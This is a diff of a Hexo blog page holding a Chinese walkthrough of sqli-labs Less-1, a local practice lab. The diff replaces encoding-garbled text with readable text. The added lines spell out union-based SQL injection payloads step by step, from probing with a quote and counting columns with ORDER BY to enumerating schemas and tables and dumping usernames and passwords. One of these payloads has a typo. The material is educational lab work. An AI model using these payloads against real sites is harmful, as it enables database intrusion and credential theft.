@@ -6,17 +6,19 @@
   
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="title: Less 1~4date: 2021-09-28 12:49:25Categories:   sqli-labstags:   web��ȫ   �ַ�ע����һ�أ�����ַ��http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;1�����������?id&#x3D;1���������������ų�����1�����һ����,���Դ���">
+  <meta name="description" content="title: Less 1~4date: 2021-09-28 12:49:25Categories:  sqli-labstags:  web安全  sqli-labs  第一关： 打开网址：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F; 1、在url后加上?id&#x3D;1,回车，回显正常 我们尝试在1后面加上’，回车发现页面报错： ![2018061823092">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/2021/09/28/Less-1-4/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="title: Less 1~4date: 2021-09-28 12:49:25Categories:   sqli-labstags:   web��ȫ   �ַ�ע����һ�أ�����ַ��http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;1�����������?id&#x3D;1���������������ų�����1�����һ����,���Դ���">
+<meta property="og:description" content="title: Less 1~4date: 2021-09-28 12:49:25Categories:  sqli-labstags:  web安全  sqli-labs  第一关： 打开网址：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F; 1、在url后加上?id&#x3D;1,回车，回显正常 我们尝试在1后面加上’，回车发现页面报错： ![2018061823092">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/49969/Pictures/Camera%20Roll/20180618230927610.png">
 <meta property="article:published_time" content="2021-09-28T04:49:25.190Z">
-<meta property="article:modified_time" content="2021-09-28T09:35:38.674Z">
+<meta property="article:modified_time" content="2021-09-28T11:32:31.845Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/49969/Pictures/Camera%20Roll/20180618230927610.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -88,18 +90,43 @@
         <hr>
 <p>title: Less 1~4<br>date: 2021-09-28 12:49:25<br>Categories:</p>
 <ul>
-<li> sqli-labs<br>tags:</li>
-<li>  web��ȫ</li>
-<li>  �ַ�ע��<br>��һ�أ�<br>����ַ��<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/">http://127.0.0.1/sqli-labs-master/Less-1/</a><br>1�����������?id=1������������<br>���ų�����1�����һ����,���Դ���</li>
+<li><p>sqli-labs<br>tags:</p>
+</li>
+<li><p>web安全</p>
+</li>
+<li><p>sqli-labs</p>
+<hr>
+<p>第一关：</p>
+<p>打开网址：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/">http://127.0.0.1/sqli-labs-master/Less-1/</a></p>
+<p>1、在url后加上?id=1,回车，回显正常</p>
+<p>我们尝试在1后面加上’，回车发现页面报错：</p>
+<p>![20180618230922590](C:\Users\49969\Pictures\Camera Roll\20180618230922590.png)</p>
+</li>
 </ul>
-<p>����Ҫ�ľ��Ǵ�����ʾ��������һ���﷨���󣬲�Ҫ�������ڡ�1������ʹ����ȷ�﷨��˵�������ǡ��ַ�ע�롣<br>2����ô��������–+��sql��������ע�͵�������ҳ�����������</p>
-<p>��˵���ǵ������ַ�ע��ʵ����<br>3����������ʹ��order by ����жϸñ��м�������<br>order by 3����������order by 4���Բ�������˵���ñ�һ����3�У�</p>
-<p>4����id����ĳ�һ�����ݿⲻ���ڵ�ֵ�����Ը�����0֮��ġ�������������ĸ�861����ʹ�����ϲ�ѯ���union select 1,2,3�鿴ҳ����ԣ�</p>
-<p>����������ʾ����֪��2����ʾλ��<br>5�����žͿ���ʹ��sql��ѯ������ν��и��ֱ��ƣ�<br>��ѯ���ݿ�����Ϣ��union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</p>
-<p>������ѯsecurity�ڵ����б�����<br>����union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br>����<br>���ű����µ�������<br>��������ѡһ��users����Ϊ����union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_name=’users’)–+</p>
-<p>��󱬳��û��������룺union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat��username��from security.users)–+</p>
-<p>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat��password��from security.users)–+</p>
-<p>���ˣ���һ�ؽ�����</p>
+<p>2、我们要的就是报错，有报错，就可以根据信息进行相应注入。</p>
+<p>这里提示是语法错误，要我们在“1”附近使用正确语法，这说明这里是单引号’注入。</p>
+<p>那我们来验证一下：用–+把sql后面的语句注释掉，发现回显正常，说明这里是单引号注入实锤：</p>
+<img src="C:\Users\49969\Pictures\Camera Roll\20180618230927610.png" alt="20180618230927610" style="zoom:80%;" />
+
+<p>3、接着我们就可以使用order by 语句进行判断，该表中一共有几列数据</p>
+<p>从1~3发现回显都正常，4的时候回显示不正常，说明该表一共有3列：</p>
+<p>![20180618230932891](C:\Users\49969\Pictures\Camera Roll\20180618230932891.png)</p>
+<p>4、接着我们要id=1改为一个数据库不存在的值，可以改成负数，0，这里任意输入一个数861，使用union select 1,2,3联合查询语句查看页面是否有显示位。</p>
+<p>![20180618230937963](C:\Users\49969\Pictures\Camera Roll\20180618230937963.png)</p>
+<p>有两个显示位。</p>
+<p>5、然后就可以利用sql查询语句爆破出自己想要的信息：</p>
+<p>我们先爆破出他的数据库名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</p>
+<p>![20180618230947113](C:\Users\49969\Pictures\Camera Roll\20180618230947113.png)</p>
+<p>查询security内的所有表名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+ </p>
+<p>![20180618230958453](C:\Users\49969\Pictures\Camera Roll\20180618230958453.png)</p>
+<p>然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br>![2018061823100417](C:\Users\49969\Pictures\Camera Roll\2018061823100417.png)</p>
+<p>最后爆出他的username和password:</p>
+<p>?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users)–+ </p>
+<p>?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concatpassword) from security.users)–+ </p>
+<p>![2018061823101365](C:\Users\49969\Pictures\Camera Roll\2018061823101365.png)</p>
+<p>至此，第一关结束！</p>
+<hr>
+<p>第二关：</p>
 
       
     </div>
